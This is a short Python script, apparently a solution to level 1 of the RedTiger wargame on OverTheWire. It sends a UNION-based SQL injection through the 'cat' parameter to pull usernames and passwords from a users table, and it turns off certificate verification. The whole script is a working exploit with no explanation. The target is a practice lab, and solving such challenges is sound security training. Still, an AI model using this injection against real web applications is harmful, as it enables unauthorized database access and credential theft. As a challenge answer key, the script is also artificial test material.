import requests

requests.packages.urllib3.disable_warnings()

url = 'http://redtiger.labs.overthewire.org/level1.php'

payload = {
	"cat": "1 union select 1,2,username,password from level1_users"
}
response = requests.get(url, params=payload, verify=False)
print(response.content)
